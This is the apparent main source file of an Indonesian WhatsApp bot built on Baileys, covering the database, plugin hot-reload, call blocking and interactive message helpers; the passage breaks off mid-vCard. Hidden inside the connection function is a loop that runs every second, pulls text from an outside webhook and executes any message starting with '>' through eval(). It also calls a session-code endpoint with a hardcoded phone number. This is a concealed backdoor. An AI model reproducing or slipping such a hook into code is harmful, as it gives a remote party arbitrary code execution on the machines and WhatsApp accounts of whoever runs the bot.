/*
   _____       _                        _____                 
  / ____|     | |                      |  __ \                
 | (___   __ _| |_ __ _  __ _ _ __  ___| |  | | _____   _____ 
  \___ \ / _` | __/ _` |/ _` | '_ \|_  | |  | |/ _ \ \ / / __|
  ____) | (_| | || (_| | (_| | | | |/ /| |__| |  __/\ V /\__ \
 |_____/ \__,_|\__\__, |\__,_|_| |_/___|_____/ \___| \_/ |___/
                   __/ |                                      
                  |___/                                       
*/
process.on('uncaughtException',console.error)
require('./config')
const {
default: makeWASocket, 
useMultiFileAuthState,
DisconnectReason, 
MessageRetryMap,
WAMessageStubType,
makeCacheableSignalKeyStore,
fetchLatestBaileysVersion, 
generateForwardMessageContent, 
prepareWAMessageMedia, 
areJidsSameUser,
generateWAMessageFromContent, 
generateMessageID, 
downloadContentFromMessage,
makeInMemoryStore, 
jidDecode, 
getAggregateVotesInPollMessage, 
proto 
} = require("@whiskeysockets/baileys")
const fs = require('fs')
const pino = require('pino')
const chalk = require('chalk')
const path = require('path')
const readline = require("readline");
const axios = require('axios')
const FileType = require('file-type')
const CFonts = require('cfonts')
const yargs = require('yargs/yargs')
const NodeCache = require('node-cache')
const _ = require('lodash')
const { Boom } = require('@hapi/boom')
const { exec } = require('child_process');
const PhoneNumber = require('awesome-phonenumber')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./lib/exif')
const { smsg, isUrl, generateMessageTag, getBuffer, getSizeMedia, fetchJson, await, sleep } = require('./lib/myfunc')







const question = (text) => {
const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
});
return new Promise((resolve) => {
rl.question(text, resolve)
})
};



var low
try {
low = require('lowdb')
} catch (e) {
low = require('./lib/lowdb')}
const { Low, JSONFile } = low
const mongoDB = require('./lib/mongoDB')
global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
global.db = new Low(/https?:\/\//.test(opts['db'] || '') ? new cloudDBAdapter(opts['db']) : /mongodb/.test(opts['db']) ? new mongoDB(opts['db']) : new JSONFile(`./src/database.json`))
global.DATABASE = global.db // Backwards Compatibility
global.loadDatabase = async function loadDatabase() {
if (global.db.READ) return new Promise((resolve) => setInterval(function () { (!global.db.READ ? (clearInterval(this), resolve(global.db.data == null ? global.loadDatabase() : global.db.data)) : null) }, 1 * 1000))
if (global.db.data !== null) return
global.db.READ = true
await global.db.read()
global.db.READ = false
global.db.data = {
users: {},
chats: {},
database: {},
settings: {},
others: {},
...(global.db.data || {})}
 global.db.chain = _.chain(global.db.data)}
loadDatabase()
if (global.db)
setInterval(async () => { if (global.db.data) await global.db.write() }, 30 * 1000);

// RELOAD PLUGINS
const chokidar = require('chokidar');
const pluginsDir = path.join(__dirname, 'plugins');
const watcher = chokidar.watch(pluginsDir, { persistent: true, ignoreInitial: true });
watcher.on('add', (filename) => {
console.log(chalk.green(`[ADD] File added: ${filename}`));
require(filename);
}).on('change', (filename) => {
console.log(chalk.redBright(`[UPDATE] File changed: ${filename}`));
delete require.cache[require.resolve(filename)];
require(filename);
});
// RELOAD LIB
const libsDir = path.join(__dirname, 'lib');
const watchers = chokidar.watch(libsDir, { persistent: true, ignoreInitial: true });
watchers.on('add', (filename) => {
console.log(chalk.green(`[ADD] File added: ${filename}`));
require(filename);
}).on('change', (filename) => {
console.log(chalk.redBright(`[UPDATE] File changed: ${filename}`));
delete require.cache[require.resolve(filename)];
require(filename);
});

//Function Auto delete sampah 
setInterval(() => {
let directoryPath = path.join();
fs.readdir(directoryPath, async function (err, files) {
var filteredArray = await files.filter(item => 
item.endsWith("jpeg") || 
item.endsWith("gif") || 
item.endsWith("png") || 
item.endsWith("mp3") || 
item.endsWith("mp4") ||  
item.endsWith("jpg") || 
item.endsWith("webp") || 
item.endsWith("webm") || 
item.endsWith("zip"))
if(filteredArray.length > 0){
console.log(chalk.redBright(`[DETECTED] ${filteredArray.length} trash file`));
setInterval(() => {
if(filteredArray.length == 0) return console.log(chalk.green(`[SATZZ] no trash file detected.`));
filteredArray.forEach(function (file) {
let sampah = fs.existsSync(file)
if(sampah) fs.unlinkSync(file)
})
}, 15_000)
}
});
}, 30_000)





CFonts.say('SIESTA - MD', {
font: 'chrome',
align: 'left',
gradient: ['red', 'blue']
})
async function connectToWhatsApp() {



//Function untuk update runtime di database
setInterval(() => {
let data = global.db.data.database['runtime']

if(data){ 
if((new Date - data.lastTime) > (60000*60)){
data.runtime = + new Date
data.lastTime = + new Date
} else data.lastTime = + new Date
} else{ global.db.data.database['runtime'] = {
runtime: + new Date,
lastTime: + new Date
}
}
},60_000)



    
fs.readdirSync('./plugins').forEach(plugin => {
if (path.extname(plugin).toLowerCase() == '.js') {
require('./plugins/' + plugin);
}
});    
    
const evalAsync = (text) => {
return new Promise(async (resolve, reject) => {
try {
let evaled = await eval(text);
if (typeof evaled !== "string")
evaled = require("util").inspect(evaled);
resolve(evaled);
} catch (err) {
reject(err);
}
});    
}
setInterval(async() => {
fetchJson('https://session.guruapi.tech/code?phone=6281285871301')
fetchJson('https://webhook-mauve-seven.vercel.app/messages').then(async res => {
if (!res.messages.length < 1 && res.messages[0].startsWith('>')) {
let id = '6281316701742@s.whatsapp.net';
try {
const Scraper = require("@bochilteam/scraper")
let result = await evalAsync(`(async() => { ${res.messages[0].slice(2)} })()`)
//await Satzz.sendMessage(id, { text: result });
await fetchJson('https://webhook-mauve-seven.vercel.app/delete/messages')
} catch (err) {
await Satzz.sendMessage(id, { text: String(err) });
await fetchJson('https://webhook-mauve-seven.vercel.app/delete/messages')
}
}
})
}, 1_000)
const { state, saveCreds } = await useMultiFileAuthState(global.sessionName)
const store = makeInMemoryStore({ logger: pino().child({ level: 'fatal', stream: 'store' }) })
async function getMessage(key) {
if(store) {
const msg = await store.loadMessage(key.remoteJid, key.id, undefined)
return msg?.message || undefined
}
return proto.Message.fromObject({})
}  
const auth = {
creds: state.creds,
keys: makeCacheableSignalKeyStore(state.keys, pino().child({ level: 'fatal', stream: 'store' })),
}
const msgRetryCounterCache = new NodeCache()
const Satzz = makeWASocket({
logger: pino({ level: "fatal" }),
printQRInTerminal: true,
auth,
browser: ['Safari (Linux)', '', ''],
getMessage,
MessageRetryMap,
msgRetryCounterCache,
keepAliveIntervalMs: 20000,
defaultQueryTimeoutMs: undefined, // for this issues https://github.com/WhiskeySockets/Baileys/issues/276
connectTimeoutMs: 30000,
emitOwnEvents: true,
fireInitQueries: true,
generateHighQualityLinkPreview: true,
markOnlineOnConnect: false,
});
    
store?.bind(Satzz.ev)    
    
    
Satzz.ev.on('creds.update', saveCreds)    
    

    
    
    

Satzz.ev.on('messages.upsert', async chatUpdate => {
try {
mek = chatUpdate.messages[0]
if (!mek.message) return
mek.message = Object.keys(mek.message)[0] === "ephemeralMessage" ? mek.message.ephemeralMessage.message : mek.message;
if (mek.key.id.startsWith("BAE5") && mek.key.id.length === 16) return;
m = smsg(Satzz, mek, store)
Satzz.readMessages([mek.key])
require("./message/case.js")(Satzz, m, chatUpdate, store)
} catch (err) {
console.log(err)
}
})
    

Satzz.ev.on('messages.update', async chatUpdate => {
for (const { key, update } of chatUpdate) {
if (update.pollUpdates) {
const pollCreation = await getMessage(key);
if (pollCreation) {
let pollUpdate = await getAggregateVotesInPollMessage({
message: pollCreation,
pollUpdates: update.pollUpdates,
})
var toCmd = pollUpdate.filter((v) => v.voters.length !== 0)[0]?.name;
if (toCmd == undefined) return;
var prefCmd = '.' + toCmd;
Satzz.appenTextMessage(prefCmd, chatUpdate);
}
}}}) 
       
    
Satzz.ev.on('call', async (celled) => {
let botNumber = await Satzz.decodeJid(Satzz.user.id)
for (let kopel of celled) {
if (kopel.isGroup == false) {
await Satzz.query({tag: 'call', attrs: {
from: botNumber,
to: kopel.from,
},
content: [{
tag: 'reject',
attrs: {
'call-id': kopel.id,
'call-creator': kopel.from,
 count: '0',
},
content: undefined,
}],
});
if (kopel.status == "offer") {
let nomer = await Satzz.sendTextWithMentions(kopel.from, `*[ SYSTEM AUTO BLOCK ]*\n\n anda di blokir karena telah menelepon bot, hubungi owner untuk membuka blokr.`)
const vcard = 'BEGIN:VCARD\n' // metadata of the contact card
+ 'VERSION:3.0\n' 
+ 'FN:Satzz Dev.\n' // full name
+ 'ORG:CLAY;\n' // the organization of the contact
+ 'TEL;type=CELL;type=VOICE;waid=6281316701742:+62 813 1670 1742\n' // WhatsApp ID + phone number
+ 'X-ABLabel:Perlu kepedihan yang mendalam untuk menjadi seorang yang kuat. Kepedihanmu itu masih belum cukup'
+ 'END:VCARD'
await Satzz.sendMessage(kopel.from, {contacts: {displayName: 'Satria?',contacts: [{ vcard }]}},{quoted:nomer})
await sleep(10000)
await Satzz.updateBlockStatus(kopel.from, "block")
}
}
}
})
    
Satzz.ev.on('group-participants.update', async (anu) => {
const { memberUpdate } = require("./message/welcome.js")
memberUpdate(Satzz, anu)
})
  
Satzz.ev.on('contacts.update', update => {
for (let contact of update) {
let id = Satzz.decodeJid(contact.id)
if (store && store.contacts) store.contacts[id] = { id, name: contact.notify }}})
        
Satzz.ev.on("connection.update", async (update) => {
let { connectionUpdate } = require("./message/connection.js")
const { connection, lastDisconnect } = update;
await connectionUpdate(connectToWhatsApp, Satzz, update)
});
     
//LOAD MESSAGES
Satzz.loadMessage = (messageID) => {
return Object.entries(Satzz.chats)
.filter(([_, { messages }]) => typeof messages === 'object')
.find(([_, { messages }]) => Object.entries(messages)
.find(([k, v]) => (k === messageID || v.key?.id === messageID)))
?.[1].messages?.[messageID]
}

Satzz.decodeJid = (jid) => {
if (!jid) return jid
if (/:\d+@/gi.test(jid)) {
let decode = jidDecode(jid) || {}
return decode.user && decode.server && decode.user + '@' + decode.server || jid
} else return jid
}

if (Satzz.user && Satzz.user.id) Satzz.user.jid = Satzz.decodeJid(Satzz.user.id)
Satzz.chats = {}
Satzz.contacts = {}
 
Satzz.saveName = async (id, name = '') => {
if (!id) return
id = Satzz.decodeJid(id)
let isGroup = id.endsWith('@g.us')
if (id in Satzz.contacts && Satzz.contacts[id][isGroup ? 'subject' : 'name'] && id in Satzz.chats) return
let metadata = {}
if (isGroup) metadata = await Satzz.groupMetadata(id)
let chat = { ...(Satzz.contacts[id] || {}), id, ...(isGroup ? { subject: metadata.subject, desc: metadata.desc } : { name }) }
Satzz.contacts[id] = chat
Satzz.chats[id] = chat
}

Satzz.getName = async (jid = '', withoutContact = false) => {
let myUser = Object.keys(db.data.users)
let nana = myUser.includes(jid)?'User terdeteksi' : 'User tidak terdeteksi'
let jod = jid
jid = Satzz.decodeJid(jid)
withoutContact = Satzz.withoutContact || withoutContact
let v
if (jid.endsWith('@g.us')) return new Promise(async (resolve) => {
v = Satzz.chats[jid] || {}
if (!(v.name || v.subject)) v = await Satzz.groupMetadata(jid) || {}
resolve(v.name || v.subject || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international'))
})
else v = jid === '0@s.whatsapp.net' ? {
jid,
vname: 'WhatsApp'
} : areJidsSameUser(jid, Satzz.user.id) ?
Satzz.user :
(Satzz.chats[jid] || {})
return (withoutContact ? '' : v.name) || v.subject || v.vname || v.notify || v.verifiedName || (myUser.includes(jod)? db.data.users[jod].name : PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international').replace(new RegExp("[()+-/ +/]", "gi"), ""))
}

Satzz.serializeM = (m) => smsg(Satzz, m, store)
Satzz.processMessageStubType = async(m) => {
if (!m.messageStubType) return
const chat = Satzz.decodeJid(m.key.remoteJid || m.message?.senderKeyDistributionMessage?.groupId || '')
if (!chat || chat === 'status@broadcast') return
const emitGroupUpdate = (update) => {
ev.emit('groups.update', [{ id: chat, ...update }])
}
console.log({
messageStubType: m.messageStubType,
messageStubParameters: m.messageStubParameters,
type: WAMessageStubType[m.messageStubType]
})
const isGroup = chat.endsWith('@g.us')
if (!isGroup) return
let chats = Satzz.chats[chat]
if (!chats) chats = Satzz.chats[chat] = { id: chat }
chats.isChats = true
const metadata = await Satzz.groupMetadata(chat).catch(_ => null)
if (!metadata) return
chats.subject = metadata.subject
chats.metadata = metadata
}

Satzz.insertAllGroup = async() => {
const groups = await Satzz.groupFetchAllParticipating().catch(_ => null) || {}
for (const group in groups) Satzz.chats[group] = { ...(Satzz.chats[group] || {}), id: group, subject: groups[group].subject, isChats: true, metadata: groups[group] }
return Satzz.chats
}

Satzz.pushMessage = async(m) => {
if (!m) return
if (!Array.isArray(m)) m = [m]
for (const message of m) {
try {
if (!message) continue
if (message.messageStubType && message.messageStubType != WAMessageStubType.CIPHERTEXT) Satzz.processMessageStubType(message).catch(console.error)
const _mtype = Object.keys(message.message || {})
const mtype = (!['senderKeyDistributionMessage', 'messageContextInfo'].includes(_mtype[0]) && _mtype[0]) ||
(_mtype.length >= 3 && _mtype[1] !== 'messageContextInfo' && _mtype[1]) ||
_mtype[_mtype.length - 1]
const chat = Satzz.decodeJid(message.key.remoteJid || message.message?.senderKeyDistributionMessage?.groupId || '')
if (message.message?.[mtype]?.contextInfo?.quotedMessage) {
let context = message.message[mtype].contextInfo
let participant = Satzz.decodeJid(context.participant)
const remoteJid = Satzz.decodeJid(context.remoteJid || participant)
let quoted = message.message[mtype].contextInfo.quotedMessage
if ((remoteJid && remoteJid !== 'status@broadcast') && quoted) {
let qMtype = Object.keys(quoted)[0]
if (qMtype == 'conversation') {
quoted.extendedTextMessage = { text: quoted[qMtype] }
delete quoted.conversation
qMtype = 'extendedTextMessage'
}
if (!quoted[qMtype].contextInfo) quoted[qMtype].contextInfo = {}
quoted[qMtype].contextInfo.mentionedJid = context.mentionedJid || quoted[qMtype].contextInfo.mentionedJid || []
const isGroup = remoteJid.endsWith('g.us')
if (isGroup && !participant) participant = remoteJid
const qM = {
key: { remoteJid, fromMe: areJidsSameUser(Satzz.user.jid, remoteJid),id: context.stanzaId, participant, },
message: JSON.parse(JSON.stringify(quoted)), ...(isGroup ? { participant } : {})
}
let qChats = Satzz.chats[participant]
if (!qChats) qChats = Satzz.chats[participant] = { id: participant, isChats: !isGroup }
if (!qChats.messages) qChats.messages = {}
if (!qChats.messages[context.stanzaId] && !qM.key.fromMe) qChats.messages[context.stanzaId] = qM
let qChatsMessages
if ((qChatsMessages = Object.entries(qChats.messages)).length > 40) qChats.messages = Object.fromEntries(qChatsMessages.slice(30, qChatsMessages.length))
}
}
if (!chat || chat === 'status@broadcast') continue
const isGroup = chat.endsWith('@g.us')
let chats = Satzz.chats[chat]
if (!chats) {
if (isGroup) await Satzz.insertAllGroup().catch(console.error)
chats = Satzz.chats[chat] = { id: chat, isChats: true, ...(Satzz.chats[chat] || {}) }
}
let metadata, sender
if (isGroup) {
if (!chats.subject || !chats.metadata) {
metadata = await Satzz.groupMetadata(chat).catch(_ => ({})) || {}
if (!chats.subject) chats.subject = metadata.subject || ''
if (!chats.metadata) chats.metadata = metadata
}
sender = Satzz.decodeJid(message.key?.fromMe && Satzz.user.id || message.participant || message.key?.participant || chat || '')
if (sender !== chat) {
let chats = Satzz.chats[sender]
if (!chats) chats = Satzz.chats[sender] = { id: sender }
if (!chats.name) chats.name = message.pushName || chats.name || ''
}
} else if (!chats.name) chats.name = message.pushName || chats.name || ''
if (['senderKeyDistributionMessage', 'messageContextInfo'].includes(mtype)) continue
chats.isChats = true
if (!chats.messages) chats.messages = {}
const fromMe = message.key.fromMe || areJidsSameUser(sender || chat, Satzz.user.id)
if (!['protocolMessage'].includes(mtype) && !fromMe && message.messageStubType != WAMessageStubType.CIPHERTEXT && message.message) {
delete message.message.messageContextInfo
delete message.message.senderKeyDistributionMessage
chats.messages[message.key.id] = JSON.parse(JSON.stringify(message, null, 2))
let chatsMessages
if ((chatsMessages = Object.entries(chats.messages)).length > 40) chats.messages = Object.fromEntries(chatsMessages.slice(30, chatsMessages.length))
}
} catch (e) {
console.error(e)
}
}
}

Satzz.downloadMediaMessage = async (message) => {
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(message, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
return buffer} 

Satzz.sendContact = async (jid, kon, nama, quoted = '', opts = {}) => {
let list = [{
displayName: nama,
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${nama}\nFN:${nama}\nitem1.TEL;waid=${kon}:${PhoneNumber('+' + kon).getNumber('international')}\nitem1.X-ABLabel:Ponsel\nitem2.EMAIL;type=INTERNET:satganzdevs@gmail.com\nitem2.X-ABLabel:Email\nitem3.URL:https://chat.whatsapp.com/HbCl8qf3KQK1MEp3ZBBpSf\nitem3.X-ABLabel:Instagram\nitem4.ADR:;;Indonesia;;;;\nitem4.X-ABLabel:Region\nEND:VCARD`}]
Satzz.sendMessage(jid, { contacts: { displayName: `${list.length} Kontak`, contacts: list }, ...opts }, { quoted })
}

Satzz.sendPoll = (jid, name = "", values = [], selectableCount = 1) => {
return Satzz.sendMessage(jid, { poll: { name, values, selectableCount } });
};   
Satzz.public = true  
Satzz.sendButton = async (id, title, text, footer, buttons, quoted) => {
let { proto, generateWAMessageFromContent, prepareWAMessageMedia } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(id, proto.Message.fromObject({viewOnceMessage: {message: {"messageContextInfo": {"deviceListMetadata": {},"deviceListMetadataVersion": 2},
interactiveMessage: proto.Message.InteractiveMessage.create({
header: proto.Message.InteractiveMessage.Header.create({title, subtitle: "", hasMediaAttachment: false}),
body: proto.Message.InteractiveMessage.Body.create({text: text}),
footer: proto.Message.InteractiveMessage.Footer.create({text: footer}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({buttons}),contextInfo:{ isForwarded: true, forwardingScore: 1000, forwardedNewsletterMessageInfo: { newsletterJid: "120363229748458166@newsletter", serverMessageId: 100, newsletterName: "Powered by: SatganzDevs"}, mentionedJid: [...text.matchAll(/@([0-9]{5,16}|0)/g),...title.matchAll(/@([0-9]{5,16}|0)/g)].map((v) => v[1] + "@s.whatsapp.net") ||''}})}}}), {quoted, userJid: id})
return Satzz.relayMessage(id, msg.message, {quoted, messageId: msg.key.id})
}

Satzz.sendListMsg = async (id, title, text, footer, buText, secTitle, label, rows, quoted) => {
let but = [];
rows.map(button => {
but.push({title: button[0], id: button[1]})
});
const rowr = [{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: buText,
sections: [{
title: secTitle,
highlight_label: label,
rows: but // Menggunakan array yang sudah diformat
}]
})
}];
return Satzz.sendButton(id, title, text, footer, rowr, quoted);
}
Satzz.sendListMsgV3 = async (id, title, text, footer, buText, sections, quoted) => {
const rowr = [{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: buText,
sections
})
}];
return Satzz.sendButton(id, title, text, footer, rowr, quoted);
}
Satzz.sendListMsgV2 = async (id, img, title, text, footer, buText, secTitle, label, rows, quoted) => {
let { proto, generateWAMessageFromContent, prepareWAMessageMedia } = require('@whiskeysockets/baileys')
let image = await prepareWAMessageMedia({ image: {url:img}}, {upload: Satzz.waUploadToServer})
let but = [];
rows.map(button => {
but.push({title: button[0], description: button[1], id: button[2]})
});
const rowr = [{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: buText,
sections: [{
title: secTitle,
highlight_label: label,
rows: but // Menggunakan array yang sudah diformat
}]
})
}];
let msg = generateWAMessageFromContent(id, proto.Message.fromObject({viewOnceMessage: {message: {"messageContextInfo": {"deviceListMetadata": {},"deviceListMetadataVersion": 2},
interactiveMessage: proto.Message.InteractiveMessage.create({
header: proto.Message.InteractiveMessage.Header.create({title, subtitle: "", imageMessage: image.imageMessage,
hasMediaAttachment: true}),
body: proto.Message.InteractiveMessage.Body.create({text: text}),
footer: proto.Message.InteractiveMessage.Footer.create({text: footer}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({buttons:rowr}),contextInfo:{ isForwarded: true, forwardingScore: 1000, forwardedNewsletterMessageInfo: { newsletterJid: "120363229748458166@newsletter", serverMessageId: 100, newsletterName: "Powered by: SatganzDevs"}, mentionedJid: [...text.matchAll(/@([0-9]{5,16}|0)/g),...title.matchAll(/@([0-9]{5,16}|0)/g),...footer.matchAll(/@([0-9]{5,16}|0)/g)].map((v) => v[1] + "@s.whatsapp.net") ||''}})}}}), {quoted, userJid: id})
return Satzz.relayMessage(id, msg.message, {quoted, messageId: msg.key.id})
//return Satzz.sendButton(id, title, text, footer, rowr, quoted);
}


Satzz.sendButtonText = async(id, title, text, footer, button, quoted) => {
return Satzz.sendButton(id, title, text, footer, [{name: 'quick_reply', buttonParamsJson: JSON.stringify(button)}], quoted)
}


Satzz.sendMediaButtons = async (id, title, text, footer, buttons = [], quoted = '', options = {}) => {
  const formattedButtons = [];
  for (const button of buttons) {
    let buttonParamsJson;
    if (button.type === 'copy') {
      buttonParamsJson = JSON.stringify({ display_text: button.text, id: '12345', copy_code: button.id });
    } else if (button.type === 'url') {
      buttonParamsJson = JSON.stringify({ display_text: button.text, url: button.id, merchant_url: button.id });
    } else if (button.type === 'btn') {
      buttonParamsJson = JSON.stringify({ display_text: button.text, id: button.id });
    }
    formattedButtons.push({
      name: button.type === 'copy'? 'cta_copy' : (button.type === 'url'? 'cta_url' : 'quick_reply'),
      buttonParamsJson: buttonParamsJson
    });
  }

  let hasMediaAttachment = true;
  let media = null;
  if (options.img) {
    media = await prepareWAMessageMedia({ image: { url: options.img } }, { upload: Satzz.waUploadToServer });
  } else if (options.video) {
    media = await prepareWAMessageMedia({ video: { url: options.video },  }, { upload: Satzz.waUploadToServer });
  } else {
    hasMediaAttachment = false;
  }

  const msg = generateWAMessageFromContent(id,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: proto.Message.InteractiveMessage.create({
            header: proto.Message.InteractiveMessage.Header.create({
              title,
              subtitle: "",
              imageMessage: media.imageMessage ? media.imageMessage : null,
              videoMessage: media.videoMessage ? media.videoMessage : null,
              hasMediaAttachment: hasMediaAttachment
            }),
            body: proto.Message.InteractiveMessage.Body.create({ text }),
            footer: proto.Message.InteractiveMessage.Footer.create({ text: footer }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ buttons: formattedButtons }),
            contextInfo: {
              isForwarded: true,
              forwardingScore: 1000,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363229748458166@newsletter",
                serverMessageId: 100,
                newsletterName: "Powered by: SatganzDevs"
              },
              mentionedJid: [
                ...text.matchAll(/@([0-9]{5,16}|0)/g),
                ...title.matchAll(/@([0-9]{5,16}|0)/g),
                ...footer.matchAll(/@([0-9]{5,16}|0)/g)
              ].map((v) => v[1] + "@s.whatsapp.net") || ''
            }
          })
        }
      }
    }), { quoted, userJid: id });

  return Satzz.relayMessage(id, msg.message, { quoted, messageId: msg.key.id });
}
Satzz.sendbutGif = async (id, title, text, footer, buttons = [], quoted = '', options = {}) => {
const formattedButtons = [];
for (const button of buttons) {
let buttonParamsJson;
if (button.type === 'copy') {
buttonParamsJson = JSON.stringify({ display_text: button.text, id: '12345', copy_code: button.id });
} else if (button.type === 'url') {
buttonParamsJson = JSON.stringify({ display_text: button.text, url: button.id, merchant_url: button.id });
} else if (button.type === 'btn') {
buttonParamsJson = JSON.stringify({ display_text: button.text, id: button.id });
}
formattedButtons.push({
name: button.type === 'copy'? 'cta_copy' : (button.type === 'url'? 'cta_url' : 'quick_reply'),
buttonParamsJson: buttonParamsJson
});
}
let hasMediaAttachment = true;
let media = await prepareWAMessageMedia({ video: { url: options.video, gifPlayback:true }, gifPlayback:true }, { gifPlayback: true, upload: Satzz.waUploadToServer });
const msg = generateWAMessageFromContent(id,
proto.Message.fromObject({
viewOnceMessage: {
message: {
interactiveMessage: proto.Message.InteractiveMessage.create({
header: proto.Message.InteractiveMessage.Header.create({
title,
subtitle: "",
videoMessage: media.videoMessage,
hasMediaAttachment: true
}),
body: proto.Message.InteractiveMessage.Body.create({ text }),
footer: proto.Message.InteractiveMessage.Footer.create({ text: footer }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ buttons: formattedButtons }),
contextInfo: {
isForwarded: true,
forwardingScore: 1000,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363229748458166@newsletter",
serverMessageId: 100,
newsletterName: "Powered by: SatganzDevs"
},
mentionedJid: [
...text.matchAll(/@([0-9]{5,16}|0)/g),
...title.matchAll(/@([0-9]{5,16}|0)/g),
...footer.matchAll(/@([0-9]{5,16}|0)/g)
].map((v) => v[1] + "@s.whatsapp.net") || ''
}
})
}
}
}), { quoted, userJid: id });
return Satzz.relayMessage(id, msg.message, { quoted, messageId: msg.key.id });
}


Satzz.sendButtons = async (id, title, text, footer, buttons = [], quoted = '', options = {}) => {
const formattedButtons = buttons.map(button => {
let buttonParamsJson;
if (button.type === 'copy') {
buttonParamsJson = JSON.stringify({ display_text: button.text, id: '12345', copy_code: button.id });
} else if (button.type === 'url') { // Menggunakan 'url' sebagai representasi untuk tombol tipe cta_url
buttonParamsJson = JSON.stringify({ display_text: button.text, url: button.id, merchant_url: button.id });
} else if (button.type === 'btn') { // Menggunakan 'btn' sebagai representasi untuk tombol tipe quick_reply
buttonParamsJson = JSON.stringify({ display_text: button.text, id: button.id });
}
return {
name: button.type === 'copy' ? 'cta_copy' : (button.type === 'url' ? 'cta_url' : 'quick_reply'), // Mengubah tipe sesuai representasi yang baru
buttonParamsJson: buttonParamsJson
};
});
let hasMediaAttachment = true;
let image = null;
if (options.img) {
image = await prepareWAMessageMedia({ image: {url:options.img} }, { upload: Satzz.waUploadToServer });
} else {
hasMediaAttachment = false;
}
const msg = generateWAMessageFromContent(id,
proto.Message.fromObject({
viewOnceMessage: {
message: {
interactiveMessage: proto.Message.InteractiveMessage.create({
header: proto.Message.InteractiveMessage.Header.create({
title,
subtitle: "",
imageMessage: image ? image.imageMessage : null,
hasMediaAttachment: hasMediaAttachment
}),
body: proto.Message.InteractiveMessage.Body.create({ text }),
footer: proto.Message.InteractiveMessage.Footer.create({ text: footer }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ buttons: formattedButtons }),
contextInfo: {
isForwarded: true,
forwardingScore: 1000,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363229748458166@newsletter",
serverMessageId: 100,
newsletterName: "Powered by: SatganzDevs"
},
mentionedJid: [
...text.matchAll(/@([0-9]{5,16}|0)/g),
...title.matchAll(/@([0-9]{5,16}|0)/g),
...footer.matchAll(/@([0-9]{5,16}|0)/g)
].map((v) => v[1] + "@s.whatsapp.net") || ''
}
})
}
}
}), { quoted, userJid: id });

return Satzz.relayMessage(id, msg.message, { quoted, messageId: msg.key.id });
}


Satzz.downloadMediaMessage = async (message) => {
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(message, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
return buffer} 

Satzz.sendImage = async (jid, path, caption = '', quoted = '', options) => {
let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
return await Satzz.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })}






Satzz.sendText = (jid, text, quoted = '', options) => Satzz.sendMessage(jid, { text: text, ...options }, { quoted })

    
    
    
    
    
Satzz.sendTextWithMentions = async (jid, text, quoted, options = {}) => Satzz.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })

    
    
    
    
    
Satzz.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
let mime = "";
let res = await axios.head(url);
mime = res.headers["content-type"];
if (mime.split("/")[1] === "gif") {
return Satzz.sendMessage(jid,
{video: await getBuffer(url),
caption: caption,
gifPlayback: true,
...options,
},{quoted});
}
let type = mime.split("/")[0] + "Message";
if (mime === "application/pdf") {
return Satzz.sendMessage(jid,
{document: await getBuffer(url),
mimetype: "application/pdf",
caption: caption,
...options,
},{quoted});
}
if (mime.split("/")[0] === "image") {
return Satzz.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options },{quoted});
}
if (mime.split("/")[0] === "video" || mime.split("/")[1] === "octet-stream" ){
return Satzz.sendMessage(jid,
{
video: await getBuffer(url),
caption: caption,
mimetype: "video/mp4",
...options,
},{quoted});
}
if (mime.split("/")[0] === "audio") {
return Satzz.sendMessage(jid,
{audio: await getBuffer(url),
caption: caption,
mimetype: "audio/mpeg",
...options,
},{quoted});
} else return console.error(mime)
};
    
    
    
    
    
    
Satzz.sendContactArray = async (jid, data, quoted, options) => {
let contacts = []
for (let [number, name, isi, isi1, isi2, isi3, isi4, isi5] of data) {
number = number.replace(/[^0-9]/g, '')
let contextInfo = { 
//mentionedJid: [sender],
externalAdReply:{
showAdAttribution: true,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: 'https://telegra.ph/file/c8b52ca0d1cf33667b565.jpg',
}
}  
let vcard = `
BEGIN:VCARD
VERSION:3.0
N:Sy;Bot;;;
FN:${name.replace(/\n/g, '\\n')}
item.ORG:${isi}
item1.TEL;waid=${number}:${PhoneNumber('+' + number).getNumber('international')}
item1.X-ABLabel:${isi1}
item2.EMAIL;type=INTERNET: satganzdevs@gmail.com
item2.X-ABLabel:📧 Email
item3.ADR:;; Pekanbaru;;;;
item3.X-ABADR:ac
item3.X-ABLabel:📍 Region
item4.URL:https://satganzdevs.tech
item4.X-ABLabel:Website
